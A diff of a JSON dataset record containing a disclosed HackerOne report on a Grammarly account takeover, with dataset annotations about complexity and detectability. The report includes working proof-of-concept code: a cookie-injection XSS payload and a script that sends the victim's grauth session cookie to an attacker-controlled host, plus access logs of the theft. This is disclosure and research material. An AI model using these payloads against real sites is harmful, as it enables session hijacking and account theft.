@@ -1,49 +1,50 @@
 {
-    "reported_to": "Grammarly",
-    "reported_by": "k4r4koyun ",
-    "title": "Account takeover through the combination of cookie manipulation and XSS",
-    "content": "\nSummary: A cookie based XSS on www.grammarly.com exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization. Normally, gnar_containerId is being set by the server however a vulnerable endpoint at gnar.grammarly.com called \"/cookies\" allows us to manipulate cookies set for *.grammarly.com and gnar_containerId was one of them. Through the combination of these findings, we were able to bypass \"CORS protection/HttpOnly cookie flag\" and steal any Grammarly users cookie that visits a webpage that has our malicious javacript code.\nDescription: An endpoint at gnar.grammarly.com called \"/cookies\" allows us to set or get any cookie value we want. Sending a POST request sets the cookie value whereas sending a GET cookie returns the value of an existing cookie. In a normal scenario, an attacker could send a GET request to that enpoint and read user authentication cookie (grauth in this case)But due to the same origin policy, we were not able to read the response . Sending a POST request was still viable(as we did not have to read the response) and we were able to replace session cookies of users (who had browsed any webpage that contained our malicious javascript) and force them to use our session. This allowed us to see any document that was created after the point of exploitation.\nThis was our initial bug bounty report (#532553) however, HackerOne staff did not approve it and said this is how cookies are supposed to work. So we decided to investigate this case further.\nThen we have found that Grammarly uses multiple cookies and one of them is called \"gnar_containerId\". We have discovered that this cookie gets reflected on the \"www.grammarly.com\" in src attribute of an img tag. The value inside the img tag is encoded and not exploitable. However there is another img tag, surrounded with noscript tags. The second value that is inside of the noscript tags was not encoded and prone to XSS. Combining the XSS vulnerability found in the www.grammarly.com domain and the cookie manipulation through gnar.grammarly.com/cookies allowed us to inject a gnar_containerId cookie that holds our malicious javascript code\nOur malicious payload that was injected into the context of grammarly.com will make a get request to gnar.grammarly.com/cookies to retrieve the values of the session cookies of the currently logged in user and send it back to our server. Normally, an ordinary XSS would not lead to such cases as grammarly cookies are set to be httponly and secure, so it is not possible to manipulate cookies through DOM. But Thanks to the endpoint that we have discovered initially, we were able to retrieve/replace any cookies that was set by *.grammarly.com. We were able to bypass the CORS as our requests were sent on behalf of the grammarly.com and read the response.\nTo put it simply, if a user visits a webpage that we control, it will steal the cookies and send them to us. Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar_containerid with the second stage of our payload and the redirect the user to the vulnerable page. Upon this, our injected payload will get triggered and will make another request to gnar.grammarly.com/cookies on behalf of the grammarly.com, then will send the response body to a server that we control.\nFor the purpose of illustration, we just stole grauth cookie of a test account but we could actually steal any cookie set by grammarly.com.\nSolution: This attack scenario was made possible because of the following:\ngnar.grammarly.com/cookies does not check Referer information when it receives POST request. Adding a Referer check (assuming that no website other than the ones that hosted at *.grammarly.com is using that endpoint) will prevent client-side requests from 3rd parties.\nThere is no whitelist/blacklist for cookies that a client can alter. Disallowing the alteration of grauth and csrf-token cookies should be implemented.\nContent based encoding was applied for noscript tags however with the combination of unnecessary trust to the cookies, an XSS was possible. Encoding should be applied for noscript tags too.\nBrowsers Verified In:\nGoogle Chrome 73.0.3683.86 (Official Build) (64-bit)\nMozilla Firefox 60.6.1esr (64-bit)\nSteps To Reproduce:\nHost a webpage that is being served over HTTPS (to circumvent Mixed-Content protection)\nServe the HTML snipped below on the said page (called \"Grammarly.html\" for example):\nCode 904 Bytes\n1<html>\n2\n3<head>\n4<title>Grammarly POC</title>\n5<meta charset=\"utf-8\"/>\n6<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n7</head>\n8\n9<body>\n10<script>\n11\n12    var cookie_hax = {\n13        \"gnar_containerId\":\"</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr\"+\"ipt><noscript>\",\n14    };\n15\n16    for (var name in cookie_hax) {\n17        $.ajax({\n18            type: \"POST\",\n19            url: \"https://gnar.grammarly.com/cookies?name=\" + name + \"&value=\" + encodeURIComponent(cookie_hax[name]) + \"&maxAge=2147483647\",\n20            cache: false,\n21            xhrFields: {\n22                withCredentials: true\n23            },\n24            crossDomain: true,\n25            async: false,\n26        });\n27    }\n28\n29    window.location.replace(\"https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal\");\n30\n31</script>\n32</body>\n33\n34</html>\nServe the javascript code below on the same webserver (called \"poc.js\" for example):\nCode 254 Bytes\n1var xhr = new XMLHttpRequest();\n2xhr.open('GET', \"https://gnar.grammarly.com/cookies?name=grauth\");\n3xhr.withCredentials = true;\n4xhr.onload = function () {\n5    this.open('GET', \"https://<YOUR_DOMAIN_NAME>/\" + this.response);\n6    this.send();\n7};\n8xhr.send();\nBrowse the Grammarly.html and watch the webserver access logs (to extract cookie value)\nSupporting Material/References:\nWebserver access logs:\nCode 474 Bytes\n1178.251.40.58 - - [10/Apr/2019:13:23:04 +0000] \"GET /poc.js HTTP/1.1\" 200 736 \"https://www.grammarly.com/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\"\n2178.251.40.58 - - [10/Apr/2019:13:23:05 +0000] \"GET /?cookie={\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588} HTTP/1.1\" 200 3466 \"https://www.grammarly.com/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\"\nImpact\nAccount takeover via cookie stealing\n\n",
-    "severity": [
-        8.2,
-        null
+  "reported_to": "Grammarly",
+  "reported_by": "k4r4koyun ",
+  "title": "Account takeover through the combination of cookie manipulation and XSS",
+  "content": "\nSummary: A cookie based XSS on www.grammarly.com exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization. Normally, gnar_containerId is being set by the server however a vulnerable endpoint at gnar.grammarly.com called \"/cookies\" allows us to manipulate cookies set for *.grammarly.com and gnar_containerId was one of them. Through the combination of these findings, we were able to bypass \"CORS protection/HttpOnly cookie flag\" and steal any Grammarly users cookie that visits a webpage that has our malicious javacript code.\nDescription: An endpoint at gnar.grammarly.com called \"/cookies\" allows us to set or get any cookie value we want. Sending a POST request sets the cookie value whereas sending a GET cookie returns the value of an existing cookie. In a normal scenario, an attacker could send a GET request to that enpoint and read user authentication cookie (grauth in this case)But due to the same origin policy, we were not able to read the response . Sending a POST request was still viable(as we did not have to read the response) and we were able to replace session cookies of users (who had browsed any webpage that contained our malicious javascript) and force them to use our session. This allowed us to see any document that was created after the point of exploitation.\nThis was our initial bug bounty report (#532553) however, HackerOne staff did not approve it and said this is how cookies are supposed to work. So we decided to investigate this case further.\nThen we have found that Grammarly uses multiple cookies and one of them is called \"gnar_containerId\". We have discovered that this cookie gets reflected on the \"www.grammarly.com\" in src attribute of an img tag. The value inside the img tag is encoded and not exploitable. However there is another img tag, surrounded with noscript tags. The second value that is inside of the noscript tags was not encoded and prone to XSS. Combining the XSS vulnerability found in the www.grammarly.com domain and the cookie manipulation through gnar.grammarly.com/cookies allowed us to inject a gnar_containerId cookie that holds our malicious javascript code\nOur malicious payload that was injected into the context of grammarly.com will make a get request to gnar.grammarly.com/cookies to retrieve the values of the session cookies of the currently logged in user and send it back to our server. Normally, an ordinary XSS would not lead to such cases as grammarly cookies are set to be httponly and secure, so it is not possible to manipulate cookies through DOM. But Thanks to the endpoint that we have discovered initially, we were able to retrieve/replace any cookies that was set by *.grammarly.com. We were able to bypass the CORS as our requests were sent on behalf of the grammarly.com and read the response.\nTo put it simply, if a user visits a webpage that we control, it will steal the cookies and send them to us. Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar_containerid with the second stage of our payload and the redirect the user to the vulnerable page. Upon this, our injected payload will get triggered and will make another request to gnar.grammarly.com/cookies on behalf of the grammarly.com, then will send the response body to a server that we control.\nFor the purpose of illustration, we just stole grauth cookie of a test account but we could actually steal any cookie set by grammarly.com.\nSolution: This attack scenario was made possible because of the following:\ngnar.grammarly.com/cookies does not check Referer information when it receives POST request. Adding a Referer check (assuming that no website other than the ones that hosted at *.grammarly.com is using that endpoint) will prevent client-side requests from 3rd parties.\nThere is no whitelist/blacklist for cookies that a client can alter. Disallowing the alteration of grauth and csrf-token cookies should be implemented.\nContent based encoding was applied for noscript tags however with the combination of unnecessary trust to the cookies, an XSS was possible. Encoding should be applied for noscript tags too.\nBrowsers Verified In:\nGoogle Chrome 73.0.3683.86 (Official Build) (64-bit)\nMozilla Firefox 60.6.1esr (64-bit)\nSteps To Reproduce:\nHost a webpage that is being served over HTTPS (to circumvent Mixed-Content protection)\nServe the HTML snipped below on the said page (called \"Grammarly.html\" for example):\nCode 904 Bytes\n1<html>\n2\n3<head>\n4<title>Grammarly POC</title>\n5<meta charset=\"utf-8\"/>\n6<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n7</head>\n8\n9<body>\n10<script>\n11\n12    var cookie_hax = {\n13        \"gnar_containerId\":\"</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr\"+\"ipt><noscript>\",\n14    };\n15\n16    for (var name in cookie_hax) {\n17        $.ajax({\n18            type: \"POST\",\n19            url: \"https://gnar.grammarly.com/cookies?name=\" + name + \"&value=\" + encodeURIComponent(cookie_hax[name]) + \"&maxAge=2147483647\",\n20            cache: false,\n21            xhrFields: {\n22                withCredentials: true\n23            },\n24            crossDomain: true,\n25            async: false,\n26        });\n27    }\n28\n29    window.location.replace(\"https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal\");\n30\n31</script>\n32</body>\n33\n34</html>\nServe the javascript code below on the same webserver (called \"poc.js\" for example):\nCode 254 Bytes\n1var xhr = new XMLHttpRequest();\n2xhr.open('GET', \"https://gnar.grammarly.com/cookies?name=grauth\");\n3xhr.withCredentials = true;\n4xhr.onload = function () {\n5    this.open('GET', \"https://<YOUR_DOMAIN_NAME>/\" + this.response);\n6    this.send();\n7};\n8xhr.send();\nBrowse the Grammarly.html and watch the webserver access logs (to extract cookie value)\nSupporting Material/References:\nWebserver access logs:\nCode 474 Bytes\n1178.251.40.58 - - [10/Apr/2019:13:23:04 +0000] \"GET /poc.js HTTP/1.1\" 200 736 \"https://www.grammarly.com/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\"\n2178.251.40.58 - - [10/Apr/2019:13:23:05 +0000] \"GET /?cookie={\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588} HTTP/1.1\" 200 3466 \"https://www.grammarly.com/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\"\nImpact\nAccount takeover via cookie stealing\n\n",
+  "severity": [
+    8.2,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1575424740,
+  "report_url": "https://hackerone.com/reports/534450",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Host a webpage with malicious JavaScript that manipulates the gnar_containerId cookie via the gnar.grammarly.com/cookies endpoint."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Cross-site Scripting (XSS) - Stored"
+    [
+      2,
+      "Redirect the user to a vulnerable page on www.grammarly.com where the malicious cookie is reflected in an unencoded noscript tag, triggering XSS."
     ],
-    "screenshots": {},
-    "disclosed_date": 1575424740,
-    "report_url": "https://hackerone.com/reports/534450",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "HIGH",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Host a webpage with malicious JavaScript that manipulates the gnar_containerId cookie via the gnar.grammarly.com/cookies endpoint."
-        ],
-        [
-            2,
-            "Redirect the user to a vulnerable page on www.grammarly.com where the malicious cookie is reflected in an unencoded noscript tag, triggering XSS."
-        ],
-        [
-            3,
-            "The XSS payload retrieves the user's session cookies via the same gnar.grammarly.com/cookies endpoint and sends them to an attacker-controlled server."
-        ]
-    ],
-    "vuln_description": "A combination of cookie manipulation via a vulnerable endpoint and DOM-based XSS allows an attacker to steal session cookies, leading to account takeover. The attack bypasses HttpOnly and CORS protections by leveraging a server endpoint that improperly allows cookie manipulation.",
-    "reason": "This vulnerability involves multiple complex components: discovering the cookie manipulation endpoint, identifying the XSS vector in the noscript tag, and crafting a payload that combines these to bypass security controls. The interaction between the cookie manipulation and XSS is non-obvious and requires deep understanding of both mechanisms.",
-    "new_complexity": "HIGH",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": "532553",
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "reason": "The vulnerability involves cookie manipulation and XSS within the same application domain (Grammarly). The methodology covers testing with different user sessions (authenticated/unauthenticated) and actions (cookie manipulation, XSS payload execution) within the same application context. The combination of these techniques would be detected by the automated analysis of HTTP requests/responses and session swapping.",
-        "is_detectable": true
-    }
+    [
+      3,
+      "The XSS payload retrieves the user's session cookies via the same gnar.grammarly.com/cookies endpoint and sends them to an attacker-controlled server."
+    ]
+  ],
+  "vuln_description": "A combination of cookie manipulation via a vulnerable endpoint and DOM-based XSS allows an attacker to steal session cookies, leading to account takeover. The attack bypasses HttpOnly and CORS protections by leveraging a server endpoint that improperly allows cookie manipulation.",
+  "reason": "This vulnerability involves multiple complex components: discovering the cookie manipulation endpoint, identifying the XSS vector in the noscript tag, and crafting a payload that combines these to bypass security controls. The interaction between the cookie manipulation and XSS is non-obvious and requires deep understanding of both mechanisms.",
+  "new_complexity": "HIGH",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "532553",
+  "injection_metadata": {
+    "reasoning": "The vulnerability involves a reflected XSS via the gnar_containerId cookie parameter, which is user-controllable through the /cookies endpoint. The methodology would detect this because: (1) Regular navigation would log HTTP interactions, including cookie parameters. (2) The program would identify gnar_containerId as injectable due to reflection in DOM. (3) Simple payloads like script tag closures would trigger XSS in the same application context (www.grammarly.com) through regular navigation to the vulnerable page. While the /cookies endpoint manipulation requires a POST, the XSS payload itself is a simple context-breaking payload detectable via same-channel DOM inspection.",
+    "is_simple_injection": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves cookie manipulation and XSS within the same application domain (Grammarly). The methodology would detect this because it involves swapping user sessions (via cookie manipulation) and executing actions (XSS payload) with the manipulated session. The steps involve normal HTTP requests that would be logged and analyzed by the methodology, specifically steps b) and c) for AuthZ/IDOR testing.",
+    "is_detectable": true
+  }
 }
